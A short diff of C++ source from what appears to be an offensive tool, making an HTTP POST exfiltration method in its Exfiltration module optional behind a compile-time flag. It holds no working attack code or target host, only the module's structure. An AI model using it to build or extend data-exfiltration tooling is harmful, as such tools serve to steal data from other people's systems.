@@ -1,9 +1,14 @@
 #include "modules/Exfiltration.hpp"
 #include "utils/Logger.hpp"
-#include "modules/exfiltration/HttpPost.hpp"
+
+#ifdef EXFIL_HTTP
+    #include "modules/exfiltration/HttpPost.hpp"
+#endif
 
 Exfiltration::Exfiltration() {
-    methods.push_back(std::make_unique<HttpPostMethod>());
+    #ifdef EXFIL_HTTP
+    methods.push_back(std::make_unique<HttpPostMethod>()); 
+    #endif
 }
 
 bool Exfiltration::execute(const std::string& args) {
